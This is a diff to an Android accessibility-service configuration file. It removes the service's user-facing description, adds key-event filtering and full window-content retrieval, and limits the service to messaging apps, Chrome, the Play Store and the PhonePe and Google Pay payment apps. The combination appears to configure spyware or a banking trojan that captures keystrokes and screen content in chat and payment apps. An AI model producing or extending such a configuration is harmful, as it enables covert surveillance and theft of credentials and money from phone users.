@@ -1,12 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
-<accessibility-service
-    xmlns:android="http://schemas.android.com/apk/res/android"
-    android:description="@string/accessibility_description"
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
     android:accessibilityEventTypes="typeAllMask"
     android:accessibilityFeedbackType="feedbackGeneric"
-    android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagRequestFilterKeyEvents"
+    android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagIncludeNotImportantViews"
     android:canRetrieveWindowContent="true"
-    android:canTakeScreenshot="true"
-    android:canPerformGestures="true"
-    android:notificationTimeout="50"
-    android:settingsActivity=".MainActivity" />
+    android:canRequestTouchExplorationMode="false"
+    android:canPerformGestures="false"
+    android:canRequestFilterKeyEvents="true"
+    android:notificationTimeout="100"
+    android:accessibilityPackageNames="com.whatsapp,com.facebook.orca,com.facebook.katana,com.instagram.android,com.google.android.apps.messaging,com.android.mms,com.android.vending,com.google.android.chrome,com.phonepe.app,com.google.android.apps.nbu.paisa.user" />
